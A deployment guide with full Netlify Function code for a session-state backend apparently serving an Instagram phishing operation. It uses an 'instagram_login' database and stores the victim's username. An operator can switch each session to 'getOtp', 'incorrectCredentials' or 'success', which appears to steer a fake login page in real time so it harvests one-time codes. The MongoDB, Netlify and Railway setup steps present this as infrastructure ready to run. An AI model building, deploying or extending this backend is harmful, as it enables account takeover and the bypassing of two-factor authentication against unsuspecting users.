# Using Netlify for Backend (Alternative to Railway)

## ⚠️ Important Considerations

**Netlify Functions Limitations:**
- **Stateless**: Each function invocation is independent (no shared memory)
- **10-second timeout** on free tier (26 seconds on paid)
- **Cold starts**: First request can be slow (~1-2 seconds)
- **No persistent storage**: Need external database for sessions

**Current Setup:**
- Uses in-memory session storage (won't work with Netlify Functions)
- Needs persistent storage solution

---

## Option 1: Use Netlify Functions + MongoDB Atlas (Free)

### Step 1: Create MongoDB Atlas Account (Free)

1. Go to https://www.mongodb.com/cloud/atlas
2. Sign up (free tier: 512MB storage)
3. Create a cluster (free tier)
4. Get connection string
5. Create database: `instagram_login`
6. Create collection: `sessions`

### Step 2: Convert Express Server to Netlify Functions

Create `netlify/functions/api.js`:

```javascript
const { MongoClient } = require('mongodb');

const MONGODB_URI = process.env.MONGODB_URI;
const client = new MongoClient(MONGODB_URI);

// Connect to MongoDB
async function connectDB() {
  if (!client.topology || !client.topology.isConnected()) {
    await client.connect();
  }
  return client.db('instagram_login').collection('sessions');
}

// CORS headers
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
};

exports.handler = async (event, context) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: corsHeaders,
      body: '',
    };
  }

  const path = event.path.replace('/.netlify/functions/api', '');
  const db = await connectDB();

  try {
    // Health check
    if (path === '/health' && event.httpMethod === 'GET') {
      return {
        statusCode: 200,
        headers: corsHeaders,
        body: JSON.stringify({ status: 'ok', message: 'Server is running' }),
      };
    }

    // Create session
    if (path === '/create-session' && event.httpMethod === 'POST') {
      const { username } = JSON.parse(event.body);
      if (!username) {
        return {
          statusCode: 400,
          headers: corsHeaders,
          body: JSON.stringify({ success: false, error: 'Username is required' }),
        };
      }

      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      await db.insertOne({
        sessionId,
        state: 'waiting',
        username,
        createdAt: new Date().toISOString(),
      });

      return {
        statusCode: 200,
        headers: corsHeaders,
        body: JSON.stringify({
          success: true,
          sessionId,
          message: 'Session created successfully',
        }),
      };
    }

    // Get state
    if (path.startsWith('/get-state/') && event.httpMethod === 'GET') {
      const sessionId = path.replace('/get-state/', '');
      const session = await db.findOne({ sessionId });

      if (!session) {
        return {
          statusCode: 404,
          headers: corsHeaders,
          body: JSON.stringify({ success: false, error: 'Session not found' }),
        };
      }

      return {
        statusCode: 200,
        headers: corsHeaders,
        body: JSON.stringify({
          success: true,
          state: session.state,
          username: session.username,
          message: `Current state: ${session.state}`,
        }),
      };
    }

    // Set state
    if (path === '/set-state' && event.httpMethod === 'POST') {
      const { sessionId, command } = JSON.parse(event.body);

      if (!sessionId || !command) {
        return {
          statusCode: 400,
          headers: corsHeaders,
          body: JSON.stringify({
            success: false,
            error: 'sessionId and command are required',
          }),
        };
      }

      const validCommands = ['getOtp', 'incorrectCredentials', 'success'];
      if (!validCommands.includes(command)) {
        return {
          statusCode: 400,
          headers: corsHeaders,
          body: JSON.stringify({
            success: false,
            error: `Invalid command. Use one of: ${validCommands.join(', ')}`,
          }),
        };
      }

      const result = await db.updateOne(
        { sessionId },
        { $set: { state: command, updatedAt: new Date().toISOString() } }
      );

      if (result.matchedCount === 0) {
        return {
          statusCode: 404,
          headers: corsHeaders,
          body: JSON.stringify({ success: false, error: 'Session not found' }),
        };
      }

      return {
        statusCode: 200,
        headers: corsHeaders,
        body: JSON.stringify({
          success: true,
          state: command,
          message: `State updated to: ${command}`,
        }),
      };
    }

    return {
      statusCode: 404,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Not found' }),
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Internal server error' }),
    };
  }
};
```

### Step 3: Create `netlify.toml`

```toml
[build]
  functions = "netlify/functions"
  publish = "build"

[[redirects]]
  from = "/api/*"
  to = "/.netlify/functions/api"
  status = 200
  force = true
```

### Step 4: Update `package.json` (root)

Add MongoDB dependency:
```json
{
  "dependencies": {
    "mongodb": "^6.0.0"
  }
}
```

### Step 5: Deploy to Netlify

1. **Go to**: https://netlify.com
2. **New site from Git** → Select your repo
3. **Build settings**:
   - Build command: `npm run build`
   - Publish directory: `build`
4. **Environment Variables**:
   - `MONGODB_URI` = Your MongoDB Atlas connection string
   - `REACT_APP_API_URL` = Your Netlify site URL (e.g., `https://instest.netlify.app`)
5. **Deploy**

### Step 6: Update React App

The API URL will be: `https://your-site.netlify.app/api/...`

---

## Option 2: Keep Railway for Backend, Use Netlify for Frontend (Recommended)

This is simpler and more reliable:

1. **Keep Railway** for backend API (already working)
2. **Deploy React app to Netlify**:
   - Go to https://netlify.com
   - New site from Git
   - Select your repo
   - Build command: `npm run build`
   - Publish directory: `build`
   - Environment variable: `REACT_APP_API_URL` = Your Railway URL

**Benefits:**
- ✅ No code changes needed
- ✅ More reliable (no cold starts)
- ✅ Better for production

---

## Option 3: Use Netlify Functions + Upstash Redis (Free)

If you want to use Netlify but avoid MongoDB setup:

1. **Sign up for Upstash Redis** (free tier): https://upstash.com
2. **Get Redis URL**
3. **Install**: `npm install @upstash/redis`
4. **Modify functions** to use Redis instead of MongoDB

This is simpler than MongoDB but requires another service.

---

## Recommendation

**Use Option 2** (Railway backend + Netlify frontend):
- ✅ No code changes
- ✅ More reliable
- ✅ Easier to maintain
- ✅ Better performance

Netlify Functions are great for simple APIs, but for session management with polling, a persistent server (Railway/Render) is better suited.
